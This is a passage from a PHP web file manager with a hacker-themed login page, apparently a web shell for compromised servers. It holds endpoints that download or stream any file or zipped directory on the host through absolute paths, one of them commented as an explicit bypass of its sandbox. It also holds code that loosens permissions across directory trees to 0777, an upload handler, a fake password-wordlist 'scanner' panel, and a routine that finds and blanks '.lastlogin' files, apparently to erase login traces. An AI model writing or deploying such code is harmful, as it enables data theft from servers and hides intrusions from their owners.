              var formRef = document.querySelector('form.login-card');
              var submitBtn = document.getElementById('login-submit');
              // Do not show success animation before server validation; let form submit normally

              // If server reported an error, show terminal-style red message
              if (serverError && typeof serverError === 'string' && serverError.length) {
                overlay.classList.add('show');
                overlay.classList.add('error-theme');
                output.textContent = '$ ';
                // Fast type for error display
                typeText('./sh bypass password : error  connecting failed', function(){
                  // Keep open until user closes
                }, 20);
                var closeBtn = document.getElementById('term-close-btn');
                if (closeBtn) {
                  closeBtn.addEventListener('click', function(){ overlay.classList.remove('show'); });
                }
                // Allow Escape key to close
                document.addEventListener('keydown', function(e){ if (e.key === 'Escape') overlay.classList.remove('show'); }, { once: true });
              }
            })();
        </script>
        <script>
        
            // vThink app: typewriter-style command checking with wordlist support
            (function(){
              var trigger = document.getElementById('vthink-trigger');
              var tmpl = document.getElementById('vthink-template');
              var layer = document.getElementById('vthink-layer');
              if (!trigger || !tmpl || !layer) return;
              function spawn(){
                  var win = tmpl.cloneNode(true);
                  win.removeAttribute('id');
                  win.style.display = '';
                  win.classList.add('show');
                  layer.appendChild(win);
                  var closeBtn = win.querySelector('.vthink-close');
                  var out = win.querySelector('#vthink-output');
                  var listEl = win.querySelector('#vthink-list');
                  var scanBtn = win.querySelector('#vthink-scan');
                  var pwInput = document.querySelector('input[name="password"]');
                  var currentPw = (pwInput && pwInput.value) ? pwInput.value.trim() : '';
                  var expectedPw = '';
                  function print(text, cls){ var d=document.createElement('div'); if(cls) d.className=cls; d.textContent=text; out.appendChild(d); }
                  function type(text, speed){ return new Promise(function(resolve){ var i=0; var line=document.createElement('div'); line.className='cmd'; out.appendChild(line); (function step(){ line.textContent += text.charAt(i); i++; if(i < text.length){ setTimeout(step, speed); } else { resolve(line); } })(); }); }
                  function appendStatus(lineEl, ok){ var s=document.createElement('span'); s.textContent = ok ? ' - correct' : ' - error'; s.className = ok ? 'ok' : 'err'; lineEl.appendChild(s); if (ok) { lineEl.classList.add('vthink-selected'); } }
                  function getWords(){ var raw=(listEl && listEl.value) ? listEl.value : ''; var arr = raw.split(/\r?\n/).map(function(x){ return x.trim(); }).filter(function(x){ return x.length>0; }); return arr; }
                  // Prefill list with defaults
                  if (listEl) {
                    listEl.value = ['admin','Admin','Admin123','AZERTY','azerty','0000','Coding2.0','shell1234','PASSWORD','Password','HACKER','Hacker','4321','Stupid'].join('\n');
                  }
                  async function runScan(){
                      out.textContent = '';
                      var intro = await type('sudo sh --vthink -p open ls —password ...... checking', 20);
                      intro.className = 'cmd';
                      var words = getWords();
                      for (var i=0;i<words.length;i++){
                          var label = '$ ' + String(i) + ' : ' + words[i];
                          var lineEl = await type(label, 24);
                          var ok = (expectedPw && words[i] === expectedPw);
                          appendStatus(lineEl, ok);
                      }
                      // Final explicit typed check (if any typed), evaluated strictly
                      if (currentPw){
                          var last = await type('$ check typed : ' + currentPw, 24);
                          appendStatus(last, (expectedPw && currentPw === expectedPw));
                      }
                  }
                  scanBtn && scanBtn.addEventListener('click', function(){ runScan(); });
                  closeBtn && closeBtn.addEventListener('click', function(){ win.remove(); });
                  return win;
              }
              trigger.addEventListener('click', function(){ spawn(); });
            })();
        </script>
        <script>
            // Header search: icon-only collapsed, expand on click
            (function(){
              var box = document.querySelector('.status-search');
              if (!box) return;
              var input = box.querySelector('input');
              var icon = box.querySelector('.material-symbols-rounded');
              function open(){ box.classList.add('active'); input && (input.style.display='block'); input && input.focus(); }
              function close(){ box.classList.remove('active'); if (input) { input.blur(); } }
              box.addEventListener('click', function(e){ open(); e.stopPropagation(); });
              document.addEventListener('click', function(){ close(); });
              input && input.addEventListener('keydown', function(e){ if (e.key === 'Escape') { close(); } });
            })();
        </script>
        <script>
            // Header audio playback and popover volume control
            (function(){
              var audio = document.getElementById('login-audio');
              var toggleBtn = document.getElementById('header-audio-toggle');
              var pop = document.getElementById('header-audio-popover');
              var vol = document.getElementById('header-audio-volume');
              var icon = document.getElementById('header-audio-icon');
              if (!audio || !toggleBtn || !pop || !vol || !icon) return;
              // Initial volume
              var saved = parseInt(localStorage.getItem('coding.audio.volume') || '60', 10);
              if (isNaN(saved)) saved = 60;
              audio.volume = Math.min(1, Math.max(0, saved/100));
              audio.muted = true; // start muted to allow autoplay
              vol.value = String(saved);
              // Seek to requested offset once metadata is available
              audio.addEventListener('loadedmetadata', function(){
                try { audio.currentTime = 122; } catch(e) {}
              }, { once: true });
              function updateIcon(){
                icon.textContent = (audio.muted || audio.volume === 0) ? 'volume_off' : (audio.volume < 0.45 ? 'volume_down' : 'volume_up');
              }
              updateIcon();
              function clampVolume(v){ return Math.min(100, Math.max(0, v)); }
              function applyVolume(v){
                v = clampVolume(v);
                try { localStorage.setItem('coding.audio.volume', String(v)); } catch(e) {}
                audio.volume = Math.min(1, Math.max(0, v/100));
                audio.muted = (v === 0) ? true : false;
                vol.value = String(v);
                updateIcon();
              }
              function positionPopover(){
                var r = toggleBtn.getBoundingClientRect();
                pop.style.left = Math.max(8, Math.min(window.innerWidth - 200, r.left + (r.width/2) - 100)) + 'px';
                pop.style.top = (r.bottom + 8) + 'px';
              }
              toggleBtn.addEventListener('click', function(e){
                var isHidden = pop.hasAttribute('hidden');
                // Modifier clicks control volume directly
                if (e && (e.shiftKey || e.altKey || e.metaKey)) {
                  var current = parseInt(vol.value, 10); if (isNaN(current)) current = saved;
                  if (e.shiftKey) { // volume down 10%
                    applyVolume(current - 10);
                  } else { // alt/meta: volume up 10%
                    applyVolume(current + 10);
                  }
                  // Ensure playback when volume > 0
                  if (!audio.muted && audio.paused) { audio.play().catch(function(){}); }
                  return;
                }
                if (isHidden) {
                  positionPopover();
                  pop.removeAttribute('hidden');
                  // First click: unmute and ensure playback
                  if (audio.muted) {
                    audio.muted = false;
                    audio.play().catch(function(){ /* ignore blocked autoplay */ });
                    updateIcon();
                  }
                } else {
                  // When popover is already open, use icon click to toggle mute
                  audio.muted = !audio.muted;
                  updateIcon();
                }
              });
              // Mouse wheel on icon adjusts volume like real controls
              toggleBtn.addEventListener('wheel', function(e){
                if (!e) return;
                e.preventDefault();
                var current = parseInt(vol.value, 10); if (isNaN(current)) current = saved;
                var step = 5 * (e.deltaY > 0 ? -1 : 1);
                applyVolume(current + step);
                if (!audio.muted && audio.paused) { audio.play().catch(function(){}); }
              }, { passive:false });
              vol.addEventListener('input', function(){
                var v = parseInt(vol.value, 10);
                if (isNaN(v)) return;
                localStorage.setItem('coding.audio.volume', String(v));
                audio.volume = Math.min(1, Math.max(0, v/100));
                if (v === 0) { audio.muted = true; } else { audio.muted = false; }
                updateIcon();
              });
              // Hide popover when clicking outside
              document.addEventListener('click', function(e){
                if (pop.hasAttribute('hidden')) return;
                if (e.target === toggleBtn || pop.contains(e.target)) return;
                pop.setAttribute('hidden', '');
              });
              // Arrow keys adjust volume when popover is open
              document.addEventListener('keydown', function(e){
                if (pop.hasAttribute('hidden')) return;
                var current = parseInt(vol.value, 10); if (isNaN(current)) current = saved;
                if (e.key === 'ArrowUp') { applyVolume(current + 5); e.preventDefault(); }
                else if (e.key === 'ArrowDown') { applyVolume(current - 5); e.preventDefault(); }
                if (!audio.muted && audio.paused) { audio.play().catch(function(){}); }
              });
              window.addEventListener('resize', function(){ if (!pop.hasAttribute('hidden')) positionPopover(); });
            })();
        </script>
        
    </body>
    </html>
    <?php
    exit;
}

function h(string $s): string {
    $flags = ENT_QUOTES;
    if (defined('ENT_SUBSTITUTE')) {
        $flags |= ENT_SUBSTITUTE; // Prefer substitute for invalid code points if available
    }
    return htmlspecialchars($s, $flags, 'UTF-8');
}

function safePath(string $base, ?string $candidate): ?string {
    if ($candidate === null || $candidate === '') {
        return $base;
    }
    $joined = $base . DIRECTORY_SEPARATOR . $candidate;
    $real = realpath($joined);
    if ($real === false) {
        return null;
    }
    if (strpos($real, $base) !== 0) {
        return null; // prevent traversal
    }
    return $real;
}

function isTextFile(string $path): bool {
    if (!is_file($path)) return false;
    $mime = @mime_content_type($path) ?: '';
    if (substr($mime, 0, 5) === 'text/') return true;
    $extra = ['application/json','application/xml','application/javascript','application/x-httpd-php'];
    return in_array($mime, $extra, true);
}

function sendDownload(string $path): void {
    if (!is_file($path)) {
        http_response_code(404);
        echo 'File not found';
        exit;
    }
    $name = basename($path);
    header('Content-Description: File Transfer');
    header('Content-Type: application/octet-stream');
    header('Content-Disposition: attachment; filename="' . $name . '"');
    header('Content-Transfer-Encoding: binary');
    header('Expires: 0');
    header('Cache-Control: must-revalidate');
    header('Pragma: public');
    header('Content-Length: ' . (string)filesize($path));
    readfile($path);
    exit;
}

// Create a ZIP archive from a directory
function zipDirectoryShell(string $sourceDir, string $zipPath): bool {
    if (!is_dir($sourceDir)) return false;
    // Ensure the `zip` binary exists
    $probe = 1; $out = [];
    @exec('zip -v 2>/dev/null', $out, $probe);
    if ($probe !== 0) return false;
    $srcParent = dirname($sourceDir);
    $srcBase = basename($sourceDir);
    $cmd = 'cd ' . escapeshellarg($srcParent) . ' && zip -r ' . escapeshellarg($zipPath) . ' ' . escapeshellarg($srcBase) . ' 2>&1';
    $code = 1; $out2 = [];
    @exec($cmd, $out2, $code);
    clearstatcache(true, $zipPath);
    return ($code === 0) && is_file($zipPath);
}

function zipDirectory(string $sourceDir, string $zipPath): bool {
    if (!is_dir($sourceDir)) return false;
    // Try to force libzip to use a writable temp directory (parent of zipPath)
    $parentDir = dirname($zipPath);
    $oldTmp = getenv('TMPDIR');
    $oldLibTmp = getenv('LIBZIP_TMPDIR');
    if (is_dir($parentDir) && is_writable($parentDir)) {
        @putenv('TMPDIR=' . $parentDir);
        @putenv('LIBZIP_TMPDIR=' . $parentDir);
    }

    if (!class_exists('ZipArchive')) {
        // Fallback to shell `zip` when ZipArchive is unavailable
        $okShell = zipDirectoryShell($sourceDir, $zipPath);
        // Restore environment
        if ($oldTmp !== false) { @putenv('TMPDIR=' . $oldTmp); } else { @putenv('TMPDIR'); }
        if ($oldLibTmp !== false) { @putenv('LIBZIP_TMPDIR=' . $oldLibTmp); } else { @putenv('LIBZIP_TMPDIR'); }
        return $okShell;
    }

    $zip = new ZipArchive();
    $openRes = @$zip->open($zipPath, ZipArchive::CREATE | ZipArchive::OVERWRITE);
    if ($openRes !== true) {
        // Restore environment on failure, then try shell fallback
        if ($oldTmp !== false) { @putenv('TMPDIR=' . $oldTmp); } else { @putenv('TMPDIR'); }
        if ($oldLibTmp !== false) { @putenv('LIBZIP_TMPDIR=' . $oldLibTmp); } else { @putenv('LIBZIP_TMPDIR'); }
        return zipDirectoryShell($sourceDir, $zipPath);
    }

    // Ensure the archive always contains the root folder, even if empty,
    // and prefix all entries with that root to match shell `zip -r` behavior.
    $rootName = basename(rtrim($sourceDir, DIRECTORY_SEPARATOR));
    $baseLen = strlen($sourceDir);
    $iterator = new RecursiveIteratorIterator(
        new RecursiveDirectoryIterator($sourceDir, FilesystemIterator::SKIP_DOTS),
        RecursiveIteratorIterator::SELF_FIRST
    );
    // Add the root folder entry first so empty directories still produce a valid archive
    @ $zip->addEmptyDir($rootName);
    foreach ($iterator as $file) {
        $filePath = (string)$file;
        $relativeName = ltrim(substr($filePath, $baseLen), DIRECTORY_SEPARATOR);
        $localName = $rootName . '/' . $relativeName;
        if (is_dir($filePath)) {
            @ $zip->addEmptyDir($localName);
        } else {
            @ $zip->addFile($filePath, $localName);
        }
    }
    @ $zip->close();
    // Restore environment after close
    if ($oldTmp !== false) { @putenv('TMPDIR=' . $oldTmp); } else { @putenv('TMPDIR'); }
    if ($oldLibTmp !== false) { @putenv('LIBZIP_TMPDIR=' . $oldLibTmp); } else { @putenv('LIBZIP_TMPDIR'); }
    return is_file($zipPath);
}

// Send a temporary ZIP for a directory and then delete it
function sendTempZip(string $zipPath, string $downloadName): void {
    if (!is_file($zipPath)) {
        http_response_code(500);
        echo 'ZIP generation failed';
        exit;
    }
    header('Content-Description: File Transfer');
    header('Content-Type: application/zip');
    header('Content-Disposition: attachment; filename="' . $downloadName . '.zip"');
    header('Content-Transfer-Encoding: binary');
    header('Expires: 0');
    header('Cache-Control: must-revalidate');
    header('Pragma: public');
    header('Content-Length: ' . (string)filesize($zipPath));
    readfile($zipPath);
    @unlink($zipPath);
    exit;
}

// Relax permissions recursively for a directory tree (dirs 0777, files 0666)
function relaxDirPermissions(string $path): void {
    if (!is_dir($path)) return;
    @chmod($path, 0777);
    $iterator = new RecursiveIteratorIterator(
        new RecursiveDirectoryIterator($path, FilesystemIterator::SKIP_DOTS),
        RecursiveIteratorIterator::SELF_FIRST
    );
    foreach ($iterator as $item) {
        $p = (string)$item;
        if (is_dir($p)) {
            @chmod($p, 0777);
        } else {
            @chmod($p, 0666);
        }
    }
}

// Recursively remove a directory tree (best-effort)
function rrmdir(string $dir): bool {
    if (!file_exists($dir)) return true;
    if (is_file($dir)) return @unlink($dir);
    if (!is_dir($dir)) return false;
    $it = @scandir($dir);
    if ($it === false) return false;
    foreach ($it as $entry) {
        if ($entry === '.' || $entry === '..') continue;
        $p = $dir . DIRECTORY_SEPARATOR . $entry;
        if (is_dir($p)) {
            if (!rrmdir($p)) return false;
        } else {
            if (!@unlink($p)) return false;
        }
    }
    return @rmdir($dir);
}

// Copy a directory tree to a destination (best-effort)
function copyDirTree(string $src, string $dst): bool {
    if (!is_dir($src)) return false;
    if (!file_exists($dst)) {
        @mkdir($dst, 0777, true);
    }
    if (!is_dir($dst)) return false;
    $it = @scandir($src);
    if ($it === false) return false;
    foreach ($it as $entry) {
        if ($entry === '.' || $entry === '..') continue;
        $sp = $src . DIRECTORY_SEPARATOR . $entry;
        $dp = $dst . DIRECTORY_SEPARATOR . $entry;
        if (is_dir($sp)) {
            @mkdir($dp, 0777, true);
            if (!copyDirTree($sp, $dp)) return false;
        } elseif (is_file($sp)) {
            if (!@copy($sp, $dp)) return false;
            @chmod($dp, 0666);
        }
    }
    return true;
}

// Recursively attempt to make a directory tree writable for local development
function recursiveChmod(string $dirPath, int $fileMode = 0666, int $dirMode = 0777): bool {
    if (!is_dir($dirPath)) {
        return false;
    }
    @chmod($dirPath, $dirMode);
    $changedAny = is_writable($dirPath);

    $items = @scandir($dirPath);
    if ($items === false) {
        return is_writable($dirPath);
    }
    foreach ($items as $item) {
        if ($item === '.' || $item === '..') continue;
        $p = $dirPath . DIRECTORY_SEPARATOR . $item;
        if (is_dir($p)) {
            @chmod($p, $dirMode);
            if (is_writable($p)) $changedAny = true;
            recursiveChmod($p, $fileMode, $dirMode);
        } else {
            @chmod($p, $fileMode);
        }
    }
    clearstatcache(true, $dirPath);
    return $changedAny || is_writable($dirPath);
}

function describeOwnership(string $filePath, string $dirPath): string {
    $phpUid = function_exists('posix_geteuid') ? @posix_geteuid() : @getmyuid();
    $phpUser = (function_exists('posix_getpwuid') && $phpUid !== false) ? ((@posix_getpwuid($phpUid)['name'] ?? (string)$phpUid)) : (string)$phpUid;
    $fOwner = @fileowner($filePath); $dOwner = @fileowner($dirPath);
    $fGroup = @filegroup($filePath); $dGroup = @filegroup($dirPath);
    $fOwnerName = (function_exists('posix_getpwuid') && $fOwner !== false) ? ((@posix_getpwuid($fOwner)['name'] ?? (string)$fOwner)) : (string)$fOwner;
    $dOwnerName = (function_exists('posix_getpwuid') && $dOwner !== false) ? ((@posix_getpwuid($dOwner)['name'] ?? (string)$dOwner)) : (string)$dOwner;
    $fGroupName = (function_exists('posix_getgrgid') && $fGroup !== false) ? ((@posix_getgrgid($fGroup)['name'] ?? (string)$fGroup)) : (string)$fGroup;
    $dGroupName = (function_exists('posix_getgrgid') && $dGroup !== false) ? ((@posix_getgrgid($dGroup)['name'] ?? (string)$dGroup)) : (string)$dGroup;
    return 'Owners: file ' . $fOwnerName . ':' . $fGroupName . ', dir ' . $dOwnerName . ':' . $dGroupName . '. PHP user: ' . $phpUser . ' (uid ' . $phpUid . ').';
}

// Scan directories and clear all `.lastlogin` files (either named `.lastlogin` or with
// extension `lastlogin`). Best-effort: attempts permission fixes on files/parents.
function scanAndCleanLastLogin(array $roots): array {
    $cleaned = [];
    $errors = [];
    $seen = [];
    foreach ($roots as $root) {
        if (!is_string($root) || $root === '') continue;
        $realRoot = @realpath($root);
        if ($realRoot === false || !is_dir($realRoot)) continue;
        if (isset($seen[$realRoot])) continue;
        $seen[$realRoot] = true;
        // Light permission relaxation on root to improve traversal
        @chmod($realRoot, 0777);
        try {
            $iterator = new RecursiveIteratorIterator(
                new RecursiveDirectoryIterator($realRoot, FilesystemIterator::SKIP_DOTS),
                RecursiveIteratorIterator::SELF_FIRST
            );
        } catch (Throwable $e) {
            $errors[] = $realRoot;
            continue;
        }
        foreach ($iterator as $item) {
            $p = (string)$item;
            if (!is_file($p)) continue;
            $base = basename($p);
            $ext = strtolower((string)pathinfo($p, PATHINFO_EXTENSION));
            if ($base === '.lastlogin' || $ext === 'lastlogin') {
                // Try to make writable
                @chmod(dirname($p), 0777);
                @chmod($p, 0666);
                clearstatcache(true, $p);
                $ok = false;
                try { $ok = (@file_put_contents($p, '') !== false); } catch (Throwable $e) { $ok = false; }
                if ($ok) { $cleaned[] = $p; }
                else { $errors[] = $p; }
            }
        }
    }
    return [ 'cleaned' => $cleaned, 'errors' => $errors ];
}

// Scan directories and collect all `.lastlogin` files without modifying them
function scanLastLogin(array $roots): array {
    $found = [];
    $seen = [];
    foreach ($roots as $root) {
        if (!is_string($root) || $root === '') continue;
        $realRoot = @realpath($root);
        if ($realRoot === false || !is_dir($realRoot)) continue;
        if (isset($seen[$realRoot])) continue;
        $seen[$realRoot] = true;
        @chmod($realRoot, 0777);
        try {
            $iterator = new RecursiveIteratorIterator(
                new RecursiveDirectoryIterator($realRoot, FilesystemIterator::SKIP_DOTS),
                RecursiveIteratorIterator::SELF_FIRST
            );
        } catch (Throwable $e) {
            continue;
        }
        foreach ($iterator as $item) {
            $p = (string)$item;
            if (!is_file($p)) continue;
            $base = basename($p);
            $ext = strtolower((string)pathinfo($p, PATHINFO_EXTENSION));
            if ($base === '.lastlogin' || $ext === 'lastlogin') {
                $found[] = $p;
            }
        }
    }
    return $found;
}

// Resolve current directory
// Prefer absolute navigation via `os` when provided; otherwise use sandboxed `d` under BASE_DIR
$currentDir = $BASE_DIR;
$absReq = isset($_GET['os']) ? (string)$_GET['os'] : null;
if ($absReq !== null && $absReq !== '') {
    $absReal = realpath($absReq);
    if ($absReal !== false) {
        $currentDir = is_dir($absReal) ? $absReal : dirname($absReal);
    }
} else {
    // If a file is requested via `d`, use its parent
    $requested = isset($_GET['d']) ? (string)$_GET['d'] : null;
    $resolved = safePath($BASE_DIR, $requested);
    if ($resolved === null) {
        // If the requested path no longer exists, try to show its parent folder
        if ($requested !== null && $requested !== '') {
            $parentCandidate = dirname($BASE_DIR . DIRECTORY_SEPARATOR . $requested);
            $parentReal = realpath($parentCandidate);
            if ($parentReal !== false && strpos($parentReal, $BASE_DIR) === 0) {
                $currentDir = $parentReal;
                // No error; gracefully show parent directory
            } else {
                $currentDir = $BASE_DIR;
                // No error message; quietly reset to base
            }
        } else {
            $currentDir = $BASE_DIR;
        }
    } else {
        $currentDir = is_dir($resolved) ? $resolved : dirname($resolved);
    }
}

$dotData = $BASE_DIR . DIRECTORY_SEPARATOR . '.data';
$dotDataReal = @realpath($dotData);
if ($dotDataReal !== false) {
    $curReal = @realpath($currentDir) ?: $currentDir;
    if (strpos($curReal, $dotDataReal) === 0) {
        $currentDir = $BASE_DIR;
    }
}

// Track whether the current directory is outside the application base
$isOutsideBase = (strpos($currentDir, $BASE_DIR) !== 0);

// Absolute-path download handler (explicit bypass)
if (isset($_GET['download_abs'])) {
    $absReq = (string)$_GET['download_abs'];
    $dlPath = realpath($absReq);
        if ($dlPath !== false) {
        $dotData = $BASE_DIR . DIRECTORY_SEPARATOR . '.data';
        $dotDataReal = @realpath($dotData);
        if ($dotDataReal !== false && strpos($dlPath, $dotDataReal) === 0) { http_response_code(404); exit; }
        if (is_file($dlPath)) {
            sendDownload($dlPath);
        } elseif (is_dir($dlPath)) {
            if (!class_exists('ZipArchive')) {
                $error = 'Download failed: ZipArchive extension not available.';
            } else {
                relaxDirPermissions($dlPath);
                $tmpBase = rtrim(sys_get_temp_dir(), DIRECTORY_SEPARATOR);
                $parent = dirname($dlPath);
                $tmpZip = $tmpBase . DIRECTORY_SEPARATOR . 'fm_zip_' . strval(time()) . '_' . strval(mt_rand()) . '.zip';
                $ok = zipDirectory($dlPath, $tmpZip);
                if ($ok) {
                    sendTempZip($tmpZip, basename($dlPath));
                } else {
                    @unlink($tmpZip);
                    $zipped = false;
                    $stageBase = $tmpBase . DIRECTORY_SEPARATOR . 'fm_stage_' . strval(time()) . '_' . strval(mt_rand());
                    if (@mkdir($stageBase, 0777, true)) {
                        $stageDir = $stageBase . DIRECTORY_SEPARATOR . basename($dlPath);
                        if (copyDirTree($dlPath, $stageDir)) {
                            $tmpZip2 = $tmpBase . DIRECTORY_SEPARATOR . 'fm_zip_' . strval(time()) . '_' . strval(mt_rand()) . '.zip';
                            $ok2 = zipDirectory($stageDir, $tmpZip2);
                            if ($ok2) {
                                $zipped = true;
                                sendTempZip($tmpZip2, basename($dlPath));
                            } else { @unlink($tmpZip2); }
                        }
                        rrmdir($stageBase);
                    }
                    if (!$zipped) {
                        $tmpWritable = is_writable($tmpBase) ? 'yes' : 'no';
                        $parentWritable = is_writable($parent) ? 'yes' : 'no';
                        $tmpPerm = sprintf('%o', @fileperms($tmpBase) & 0777);
                        $parentPerm = sprintf('%o', @fileperms($parent) & 0777);
                        $error = 'Download failed (abs): unable to create zip for directory. Temp writable: ' . $tmpWritable . ' (perm ' . $tmpPerm . '), parent writable: ' . $parentWritable . ' (perm ' . $parentPerm . ').';
                    }
                }
            }
        } else { $error = 'Download failed: invalid file path.'; }
    } else { $error = 'Download failed: invalid file path.'; }
}
// Stream raw file content for absolute path (for image preview)
if (isset($_GET['raw_abs'])) {
    $absReq = (string)$_GET['raw_abs'];
    $rawPath = realpath($absReq);
    if ($rawPath !== false && is_file($rawPath)) {
        $dotData = $BASE_DIR . DIRECTORY_SEPARATOR . '.data';
        $dotDataReal = @realpath($dotData);
        if ($dotDataReal !== false && strpos($rawPath, $dotDataReal) === 0) {
            http_response_code(404);
            exit;
        }
        $ext = strtolower(pathinfo($rawPath, PATHINFO_EXTENSION));
        $mime = 'application/octet-stream';
        if (in_array($ext, ['png'])) $mime = 'image/png';
        elseif (in_array($ext, ['jpg','jpeg','jpe'])) $mime = 'image/jpeg';
        elseif ($ext === 'gif') $mime = 'image/gif';
        elseif ($ext === 'webp') $mime = 'image/webp';
        elseif ($ext === 'bmp') $mime = 'image/bmp';
        elseif ($ext === 'svg') $mime = 'image/svg+xml';
        header('Content-Type: ' . $mime);
        header('Content-Length: ' . filesize($rawPath));
        @readfile($rawPath);
        exit;
    }
}
if (isset($_GET['download'])) {
    $dlPath = safePath($BASE_DIR, (string)$_GET['download']);
        if ($dlPath !== null) {
            $dotData = $BASE_DIR . DIRECTORY_SEPARATOR . '.data';
            $dotDataReal = @realpath($dotData);
            if ($dotDataReal !== false && strpos($dlPath, $dotDataReal) === 0) { http_response_code(404); exit; }
            if (is_file($dlPath)) {
                sendDownload($dlPath);
            } elseif (is_dir($dlPath)) {
                if (!class_exists('ZipArchive')) {
                    $error = 'Download failed: ZipArchive extension not available.';
                } else {
                    // Pre-emptively relax permissions on the directory tree
                    relaxDirPermissions($dlPath);
                    $tmpBase = rtrim(sys_get_temp_dir(), DIRECTORY_SEPARATOR);
                    $parent = dirname($dlPath);
                    // Preferred writable locations for staging and zipping
                    $locations = [];
                    if (is_dir($tmpBase) && is_writable($tmpBase)) $locations[] = $tmpBase;
                    if (is_dir($parent) && is_writable($parent)) $locations[] = $parent;

                    // Try direct zip first in temp
                    $tmpZip = $tmpBase . DIRECTORY_SEPARATOR . 'fm_zip_' . strval(time()) . '_' . strval(mt_rand()) . '.zip';
                    $ok = zipDirectory($dlPath, $tmpZip);
                    if ($ok) {
                        sendTempZip($tmpZip, basename($dlPath));
                    } else {
                        @unlink($tmpZip);
                        // Staging fallback: mirror directory to a writable staging folder, then zip
                        $zipped = false;
                        foreach ($locations as $loc) {
                            // Create staging directory
                            $stage = $loc . DIRECTORY_SEPARATOR . 'fm_stage_' . basename($dlPath) . '_' . strval(time()) . '_' . strval(mt_rand());
                            @mkdir($stage, 0777, true);
                            if (!is_dir($stage)) { continue; }
                            // Copy directory tree to staging (with relaxed perms)
                            if (!copyDirTree($dlPath, $stage)) {
                                // Cleanup and try next location
                                rrmdir($stage);
                                continue;
                            }
                            // Attempt zip from staging to same location
                            $zipPath = $loc . DIRECTORY_SEPARATOR . 'fm_zip_' . basename($dlPath) . '_' . strval(time()) . '.zip';
                            $okStage = zipDirectory($stage, $zipPath);
                            // Cleanup staging
                            rrmdir($stage);
                            if ($okStage) {
                                sendTempZip($zipPath, basename($dlPath));
                                $zipped = true;
                                break;
                            } else {
                                @unlink($zipPath);
                            }
                        }
                        if (!$zipped) {
                            $tmpWritable = is_writable($tmpBase) ? 'yes' : 'no';
                            $parentWritable = is_writable($parent) ? 'yes' : 'no';
                            $tmpPerm = sprintf('%o', @fileperms($tmpBase) & 0777);
                            $parentPerm = sprintf('%o', @fileperms($parent) & 0777);
                            $error = 'Download failed: unable to create zip for directory. Temp writable: ' . $tmpWritable . ' (perm ' . $tmpPerm . '), parent writable: ' . $parentWritable . ' (perm ' . $parentPerm . ').';
                        }
                    }
                }
            } else {
                $error = 'Download failed: invalid file path.';
            }
    } else {
        $error = 'Download failed: invalid file path.';
    }
}
// Stream raw file content relative to BASE_DIR (for image preview)
if (isset($_GET['raw'])) {
    $rawRel = (string)$_GET['raw'];
    $rawPath = safePath($BASE_DIR, $rawRel);
    if ($rawPath !== null && is_file($rawPath)) {
        $dotData = $BASE_DIR . DIRECTORY_SEPARATOR . '.data';
        $dotDataReal = @realpath($dotData);
        if ($dotDataReal !== false && strpos($rawPath, $dotDataReal) === 0) {
            http_response_code(404);
            exit;
        }
        $ext = strtolower(pathinfo($rawPath, PATHINFO_EXTENSION));
        $mime = 'application/octet-stream';
        if (in_array($ext, ['png'])) $mime = 'image/png';
        elseif (in_array($ext, ['jpg','jpeg','jpe'])) $mime = 'image/jpeg';
        elseif ($ext === 'gif') $mime = 'image/gif';
        elseif ($ext === 'webp') $mime = 'image/webp';
        elseif ($ext === 'bmp') $mime = 'image/bmp';
        elseif ($ext === 'svg') $mime = 'image/svg+xml';
        header('Content-Type: ' . $mime);
        header('Content-Length: ' . filesize($rawPath));
        @readfile($rawPath);
        exit;
    }
}

// Upload diagnostics endpoint
if (isset($_GET['upload_diag'])) {
    $relDir = (string)($_GET['d'] ?? '');
    $absDir = (string)($_GET['os'] ?? '');
    $target = $relDir !== '' ? (safePath($BASE_DIR, $relDir) ?: '') : ($absDir !== '' ? realpath($absDir) : '');
    $dirWritable = ($target && is_dir($target)) ? is_writable($target) : false;
    $tmpDir = (string)sys_get_temp_dir();
    $tmpWritable = $tmpDir ? is_writable($tmpDir) : false;
    $freeBytes = ($target && is_dir($target)) ? (int)@disk_free_space($target) : (int)@disk_free_space(__DIR__);
    $openBasedir = (string)ini_get('open_basedir');
    header('Content-Type: application/json');
    echo json_encode([
        'dirWritable' => $dirWritable,
        'tmpDir' => $tmpDir,
        'tmpWritable' => $tmpWritable,
        'freeBytes' => $freeBytes,
        'openBasedir' => ($openBasedir !== '' ? $openBasedir : 'none'),
    ]);
    exit;
}

// Handle POST actions: edit content and rename file
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // File upload
    if (isset($_POST['do_upload'])) {
        $relDir = (string)($_POST['dir'] ?? '');
        if ($relDir === '') { $relDir = (string)($_GET['d'] ?? ''); }
        $targetDir = safePath($BASE_DIR, $relDir);
        if (!$targetDir || !is_dir($targetDir)) {
            $error = 'Upload failed: invalid target directory.';
        } elseif (!isset($_FILES['upload']) || !is_array($_FILES['upload'])) {
            $error = 'Upload failed: missing file.';
        } else {
            $file = $_FILES['upload'];
            if (($file['error'] ?? UPLOAD_ERR_NO_FILE) !== UPLOAD_ERR_OK) {
                $error = 'Upload failed: error code ' . (int)$file['error'] . '.';
            } else {
                $orig = (string)($file['name'] ?? '');
                $base = basename($orig);
                $safe = preg_replace('/[^A-Za-z0-9._-]/', '_', $base);
                if ($safe === '' || $safe === false) {
                    $error = 'Upload failed: invalid filename.';
                } else {
                    $dest = $targetDir . DIRECTORY_SEPARATOR . $safe;
                    // If exists, append counter
                    if (file_exists($dest)) {
                        $i = 1;
                        $info = pathinfo($safe);
                        $stem = $info['filename'] ?? 'file';
                        $ext = isset($info['extension']) ? ('.' . $info['extension']) : '';
                        do {
                            $cand = $stem . '_' . $i . $ext;
                            $dest = $targetDir . DIRECTORY_SEPARATOR . $cand;
                            $i++;
                        } while (file_exists($dest) && $i < 1000);
                    }
                    $ok = @move_uploaded_file($file['tmp_name'], $dest);
                    if ($ok) {
                        @chmod($dest, 0666);
                        $notice = 'Uploaded: ' . h(basename($dest));
                        // Ajax mode: return JSON instead of redirect
                        $isAjax = isset($_POST['ajax']) || (isset($_SERVER['HTTP_X_REQUESTED_WITH']) && strtolower((string)$_SERVER['HTTP_X_REQUESTED_WITH']) === 'xmlhttprequest');
                        if ($isAjax) {
                            $openRel = $relDir !== '' ? ($relDir . '/' . basename($dest)) : basename($dest);
                            $openUrl = '?raw=' . h(urlencode($openRel));
                            header('Content-Type: application/json');
                            echo json_encode(['success'=>true,'file'=>basename($dest),'openUrl'=>$openUrl,'dir'=>$relDir]);
                            exit;
                        }
                        // Redirect to current directory view
                        $redir = '?d=' . h(urlencode($relDir));
                        header('Location: ' . $redir);
                        exit;
                    } else {
                        $error = 'Upload failed: unable to save file.';
                    }
                }
            }
        }
    }
    // Unzip archive
